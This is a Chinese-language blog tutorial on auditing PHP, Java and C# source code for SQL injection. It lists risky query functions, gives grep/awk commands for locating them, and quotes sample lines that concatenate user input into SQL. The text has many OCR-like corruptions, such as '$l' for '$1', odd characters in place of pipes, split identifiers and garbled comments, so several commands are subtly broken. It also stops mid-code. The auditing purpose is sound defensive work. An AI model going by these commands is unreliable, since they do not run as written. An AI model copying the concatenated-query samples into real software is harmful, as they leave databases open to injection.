所有查询字符串、表单、cookie和服务器变量的组合集string variable = Request.Params["name"];//Querystring所有查询字符串项的集合string variable = Request.Querystring["name"];//Servervariable所有Web服务器变量的集合string variable = Request.Servervariables["name"];//Url返回一个URI类型的对象，其Query属性包含了 URI中的信息，比如?foo=barUri object_variable = Request.Url;string variable = object_variable.Query;//UserAgent包含浏览器的用户代理头string variable = Request.UserAgent;//UserHostAddress包含客户端的远程IP地址string variable = Request.UserHostAddress;//UserHostName 含客户端的远程主机名string variable = Request.UserHostName;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="危险的函数"><a href="#危险的函数" class="headerlink" title="危险的函数"></a>危险的函数</h4><h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//mssql_query ()向当前使用的数据库发送一个查询</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mssql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mysql_query ()向当前使用的数据库发送一个查询</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mysql_db_query ()选择一个数据库，在该数据库上执行一个查询</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_db_query</span> <span class="token punctuation">(</span><span class="token variable">$dbf</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//oci_parse ()在语句执行之前对其进行解析</span><span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token function">oci_parse</span><span class="token punctuation">(</span><span class="token variable">$connection</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ociexecute</span><span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ora_parse ()在语句执行之前对其进行解析</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ora_parse</span><span class="token punctuation">(</span><span class="token variable">$cursorr</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token function">ora_exec</span><span class="token punctuation">(</span><span class="token variable">$cursor</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//mssql_bind ()向存储过程添加一个参数</span><span class="token function">mssql_bind</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stmt<span class="token punctuation">,</span> <span class="token number">1</span>@param<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token variable">$variable</span><span class="token punctuation">,</span> <span class="token constant">SQLVARCHAR</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mssql_execute</span><span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//odbc_prepare ()准备一条执行语句</span><span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token function">odbc_prepare</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">odbc_execute</span><span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//odbc_ exec ()准备并执行一条SQL语句</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">odbc_exec</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//pg_query一执行一个查询(曾称为pg_exec)</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">pg_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//pg_exec—*¥兼容性原因依然可用，但建议用户使用新的函数名</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">pg_exec</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span> <span class="token operator">/</span>pg_send_query—发送—异步查询乙<span class="token function">pg_send_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//pg_send_query_params一向服务器提交一个命令并分离参数，无须等待结果</span><span class="token function">pg_send_query_params</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$params</span><span class="token punctuation">)</span><span class="token comment">//pg_query_params一向服务器提交一个命令并等待结果</span><span class="token function">pg_query_params</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$params</span><span class="token punctuation">)</span><span class="token comment">//pg_send_prepare一发送一个请求以创建一条具有指定参数的预备语句，无须等待完成</span>pg <span class="token function">send_prepare</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"my_query"</span><span class="token punctuation">,</span> <span class="token operator">*</span> <span class="token constant">SELECT</span> <span class="token operator">*</span> <span class="token constant">FROM</span> table <span class="token constant">WHERE</span> field <span class="token operator">=</span> <span class="token variable">$11</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">pg_send_execute</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"my_query"</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//pg_pr epare—S送一个请求以劄建一条具有指定参数的预备语句并等待完成</span><span class="token function">pg_prepare</span><span class="token punctuation">(</span><span class="token variable">$connz</span> <span class="token string double-quoted-string">"my_query"</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token constant">SELECT</span> <span class="token operator">*</span> <span class="token constant">FROM</span> table <span class="token constant">WHERE</span> field <span class="token operator">=</span> <span class="token variable">$1</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">pg_execute</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> nmy_query"<span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//pg_select一根据指定的具有field=&gt;value的assoc_array选择记录</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">pg_select</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$table_name</span><span class="token punctuation">,</span> <span class="token variable">$assoc_array</span><span class="token punctuation">)</span><span class="token comment">//pg_update (Y—用数据更新与指定条件_的记录</span><span class="token function">pg_update</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$arr_update</span><span class="token punctuation">,</span> <span class="token variable">$arr_where</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//pg_insert ()—将 assoc_array 的值插入到 table_name 指定的表中</span><span class="token function">pg_insert</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$table_name</span><span class="token punctuation">,</span> <span class="token variable">$assoc_array</span><span class="token punctuation">)</span><span class="token comment">//pg_delete () 一根据assoc_array中指定的键和值删除表中的记录</span><span class="token function">pg_delete</span><span class="token punctuation">(</span><span class="token variable">$connr</span> <span class="token variable">$table_name</span><span class="token punctuation">,</span> <span class="token variable">$assoc_array</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h5><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//createStatement ()一仓d建一个语句对象以便向数据库发送SQL语句</span>statement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//prepareStatement () 一创建一条预编译的SQL语句并将其保存到对象中</span><span class="token class-name">PreparedStatement</span> sql <span class="token operator">=</span> con<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//executeQuery () 一 行给定的SQL语句，从指定的表中获取数据</span>result <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//executeUpdate ()— 行一条SQL语句，该语句可能是一条条返回任何值的INSERT、UPDATE或 //DELETE 语句</span>result <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeUpdate</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//execute ()— 行给定的SQL语句，从指定的表中获取数据</span>result <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//addBatch () 一将指定的SQL命令添加到当前命令列表中</span>statement<span class="token punctuation">.</span><span class="token function">addBatch</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>statement<span class="token punctuation">.</span><span class="token function">addBatch</span><span class="token punctuation">(</span>more_aql<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="C"><a href="#C" class="headerlink" title="C#"></a>C#</h5><p>.NET开发使用下列命名空间</p><pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">System.Data.SqlClient： SQL Server 的.NET Framework Data Provider(.NET 框架数据提供程序)System.Data.OleDb： OLE DB 的.NET Framework Data ProviderSystem.Data.OracleClient： Oracle 的.NET Framework Data ProvideroSystem.Data.Odbc: ODBC 的.NET Framework Data Provider<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">//SqlCommand()  用于构造或发送SQL语句或存储过程SqlCommand command = new SqlCommand(sql, connection);//SqlParameter()  用于向 SqlCommand 对象添加参数SqlCommand command = new SqlCommand(sql,connection);command.Parameters.Add("@param", SqlDbType.VarChar, 50).Value = input; //OleDbCommand()  用于构造或发送SQL语句或存储过程OleDbCommand command = new OleDbCommand(sql,connection);//OleDbParameter()  用于向 OleDbCommand 对象添加参数OleDvCommand command = new OleDbCommand($sql,connection);command.parameters.Add("@paran", OleDbType.VarChar, 50).Value = input; //OracleCommand()  用于构造/发送SQL语句或存储过程oracleCommand command = new OracleCommand(sql,connection);//OracleParameter()  用于向 OracleCommand 对象添加参数OracleCommand command = new OracleCommand(sql,connection); command.Parameters.Add("@param", OleDbType.VarChar,50).Value = input; //OdbcCommand()  用于构造或发送SQL语句OdbcCommand command = new OdbcCommand(sql,connection);//OdbcParameter()  用于向 OdbcCommand 对象添加参数OdbcCommand command = new OdbcCommand(sql,connection);command.Parameters.Add("@paramn",OleDbType.VarChar,50) .Value = input;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="跟踪数据"><a href="#跟踪数据" class="headerlink" title="跟踪数据"></a>跟踪数据</h4><h5 id="跟踪PHP中的数据"><a href="#跟踪PHP中的数据" class="headerlink" title="跟踪PHP中的数据"></a>跟踪PHP中的数据</h5><p>首先注意到<code>register_globals</code>和<code>magic_quotes</code>的状态</p><p><code>register_globals</code>负责将EGPCS注册成全局变量，<code>magic_qoutes</code>过滤单引号、双引号、反斜线、NULL字符。</p><p>接下来排查代码，搜索php源文件目录，寻找<code>mssql_query()、mysql_query()、mysql_db_query()</code>作用：直接将用户输入插入SQL语句中</p><p>用以下命令打印匹配的内容文件名和行号</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span><span class="token string">"\(mysql\|mssql\|mysql_db\)_query\(.*\$\(GET\|\POST\)"</span>.*<span class="token punctuation">\</span><span class="token punctuation">)</span><span class="token string">" src/ | awk -F: '{print "</span>filename: <span class="token string">"<span class="token variable">$l</span>"</span><span class="token punctuation">\</span>nline: <span class="token string">"<span class="token variable">$2</span>"</span><span class="token punctuation">\</span>nmatch: <span class="token string">"<span class="token variable">$3</span>"</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>n<span class="token string">"}'filename: src/mssql_query.vuln.phpline: 11match: <span class="token variable">$result</span> = mssql_query("</span>SELECT * FROM TBL WHERE COLUMN <span class="token operator">=</span><span class="token string">'$_GET['</span>var<span class="token string">']'</span><span class="token string">");filename: src/mysql_query.vuln.phpline: 13match: <span class="token variable">$result</span> = mysql_query("</span>SELECT * FROM TBL WHERE COLUMN <span class="token operator">=</span> <span class="token string">'$_GET['</span>var<span class="token string">']'</span>",<span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>寻找<code>oci_parse、ora_parse</code>作用：直接将用户输入插入SQL文件中，优先级大于<code>oci_exec、ora_exec、oci_execute</code></p><p>命令与前面相识</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span>  <span class="token string">"\(oci\|ora\)_parse\(.*\<span class="token variable">$_</span>\(GET\|\POST\).*\)"</span> src/ <span class="token operator">|</span><span class="token function">awk</span> -F: <span class="token number">1</span><span class="token punctuation">{</span>print <span class="token string">"filename: "</span><span class="token variable">$l</span><span class="token string">"<span class="token entity" title="\n">\n</span>line: "</span><span class="token variable">$2</span><span class="token string">"<span class="token entity" title="\n">\n</span>match: "</span><span class="token variable">$3</span><span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">}</span><span class="token string">' filename: src/oci_parse.vuln.phpline: 4match: $stid = oci_parse($conn, "SELECT * FROM TABLE WHERE COLUMN = '</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'var1]'</span><span class="token string">");filename: src/ora_parse.vuln.phpline: 13match: ora_parse(<span class="token variable">$curs</span>,"</span>SELECT * FROM TABLE WHERE COLUMN <span class="token operator">=</span><span class="token string">'$_GET['</span>var<span class="token string">']'</span>"<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>寻找<code>odbc_prepare()、odbc_exec()</code>作用：直接将用户输入插入SQL文件中，<code>odbc_prepare()</code>先于<code>odbc_execute()</code>被编译成SQL语句</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"\(odbc_prepare\|odbc_exec\)\(.*\<span class="token variable">$_</span>\(GET\|\POST\).*\)"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>寻找<code>mssql_bind()</code>作用：直接将用户输入插入到SQL文件中，优先级大于<code>mssql_execute()</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"mssql_bind\(.*\<span class="token variable">$_</span>\(GET\|\POST\).*\)"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F:<span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#形如</span>$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM TBL WHERE COLUMN = '$_GET['var']'"</span><span class="token punctuation">;</span>$result <span class="token operator">=</span> mysql_query<span class="token punctuation">(</span>$<span class="token keyword">sql</span><span class="token punctuation">,</span> $link<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>上面的命令不能匹配，将上面的命令合并优化得到</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"mssql_query(\|mysql_query(\|mysql_db_query(\|oci_parse (\|ora_parse(\|mssql_bind(\|mssql_execute(\|odbc_prepare(\|odbc_execute (\|odbc_execute(\|odbc_exec("</span>src/ <span class="token operator">|</span> <span class="token function">awk</span> -F:<span class="token string">'{print"filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>理想获得</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">filename: src/SQLi.MySQL.vulnerable.phpline: <span class="token number">20</span>match: <span class="token variable">$result</span> <span class="token operator">=</span> mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>mysql_query()向数据库发送一条查询，但不知道$sql的值，无法判断是否被污染，所以跟踪$sql变量</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"\<span class="token variable">$sql</span>"</span> src/ 丨 <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span class="token comment">#变量可能重用，不采用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"\<span class="token variable">$sql</span> =.*<span class="token entity" title="\&quot;">\"</span>\(SELECT\|UPDATE\|INSERT\|DROP\)"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span class="token comment">#使用sql语句查找，缩小排查</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>理想获得</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">filename: src/SQLi.MySQL.vulnerable.phpline: <span class="token number">20</span>match: <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM table WHERE field = '<span class="token variable">$_GET</span>['input']'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这是可以判断存在SQL注入</p><p>另一种情况</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">filename: src/SQLi.MySQL.vulnerable.phpline: <span class="token number">20</span>match: <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM table WHERE field = '$ input'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>又不能判断$input 是否被污染，跟踪$input</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"\<span class="token variable">$input</span>=.*\$.*"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F:<span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>理想结果</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">filename: src/SQLi.MySQL.vulnerable.phpline: <span class="token number">10</span>match: <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是还是不能断定存在SQL注入，因为可以存在对$input的过滤</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"\<span class="token variable">$input</span>"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">filename: src/SQLi.MySQL.vulnerable.phpline: <span class="token number">11</span>match: <span class="token keyword">if</span> <span class="token punctuation">(</span>is_string<span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">))</span><span class="token punctuation">{</span>filename: src/SQLi.MySQL.vulnerable.phpline: <span class="token number">12</span>match: <span class="token keyword">if</span> <span class="token punctuation">(</span>strlen<span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token variable">$maxlength</span><span class="token punctuation">)</span><span class="token punctuation">{</span>filename: src/SQLi.MySQL.vulnerable.phpline: <span class="token number">13</span>match: <span class="token keyword">if</span> <span class="token punctuation">(</span>ctype_alnum<span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">))</span><span class="token punctuation">{</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>经过对过滤函数的分析，就能判断是否存在SQL注入</p><h5 id="跟踪Java中的数据"><a href="#跟踪Java中的数据" class="headerlink" title="跟踪Java中的数据"></a>跟踪Java中的数据</h5><p>在Java源文件的目录中，寻找是否存在使用了 prepareStatement()、 executeQuery()、executeUpdate()、addBatch()和 executeBatch()的文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"preparedStatement(\|executeQuery(\|executeUpdate(\|exe cute(\|addBatch(\|executeBatch("</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F:<span class="token string">'{print "filename:"$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">filename: src/SQLVuln.javaline: <span class="token number">89</span>match: ResultSet rs <span class="token operator">=</span> statement.executeQuery<span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>filename: src/SQLVuln.javaline: <span class="token number">139</span>match: statement.executeUpdate<span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>filename: src/SQLVuln.javaline: <span class="token number">209</span>match: ResultSet rs <span class="token operator">=</span> statement.executeQuery<span class="token punctuation">(</span><span class="token string">"SELECT field FROM table WHERE field = "</span> +request.getParameter<span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>209行<code>input</code>是用户直接通过表单提交输入，存在SQL注入</p><p>还需对89,139行的sql进行跟踪判断是否被污染</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> - i <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"sql =.*<span class="token entity" title="\&quot;">\"</span>\(SELECT\|UPDATE\|INSERT\|DROP\)"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span>filename: src/SQLVuln.javaline: <span class="token number">88</span>match: String sql <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"SELECT field FROM table WHERE field = "</span> + request.getParameter<span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">))</span><span class="token punctuation">;</span>filename: src/SQLVuln.javaline: <span class="token number">138</span>match: String sql <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"INSERT INTO table VALUES field = ("</span> +request.getParameter <span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span> + <span class="token string">") WHERE field = "</span> + request. getParameter <span class="token punctuation">(</span><span class="token string">"more-input"</span><span class="token punctuation">)</span> + "<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和前面一样，也存在SQL注入</p><p>找到渗入源</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"getParameter(\|getParameterValues(\|getQueryString (\|getHeader(\|getHeaders(\|getRequestedSessionld(\|getCookies(\|getValue("</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="跟踪C-中的数据"><a href="#跟踪C-中的数据" class="headerlink" title="跟踪C#中的数据"></a>跟踪C#中的数据</h5><p>在一个C#源文件的目录中，寻找使用了 SqlCommand()、SqlParameter()、OleDbCommand()、OleDbParameter()、OracleCommand()、OracleParameter() 、OdbcCommand()和 OdbcParameter()的位置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"SqlCommand(\|SqlParameter(\|OleDbCommand(\|OleDbParam eter(\|OracleCommand(\|OracleParameter(\|OdbcCommand(\|OdbcParameter("</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span>filename: src/SQLiMSSQLVuln.csline: <span class="token number">29</span>match: SqlCommand <span class="token builtin class-name">command</span> <span class="token operator">=</span> new SqlCommand<span class="token punctuation">(</span><span class="token string">"SELECT ★ FROM table WHERE field = '"</span> + request.getParameter<span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span> + <span class="token string">"'"</span>,conn<span class="token punctuation">)</span><span class="token punctuation">;</span>filename: src/SQLiOracleVuln.csline: <span class="token number">69</span>match: OracleCommand <span class="token builtin class-name">command</span> <span class="token operator">=</span> new OracleCommand<span class="token punctuation">(</span>sql, conn<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>29行<code>input</code>是用户直接通过表单提交输入，存在SQL注入</p><p>还需对69行的sql进行跟踪判断是否被污染</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"sql =.*<span class="token entity" title="\&quot;">\"</span> \(SELECT\|UPDATE\|INSERT\|DROP\)"</span> src/ I <span class="token function">awk</span> -F:<span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span>filename: src/SQLiOracleVuln.csline: <span class="token number">68</span>match: String sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM table WHERE field = '"</span> + request.getParameter<span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span> + <span class="token string">"'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>和前面一样，也存在SQL注入</p><p>找到渗入源</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token 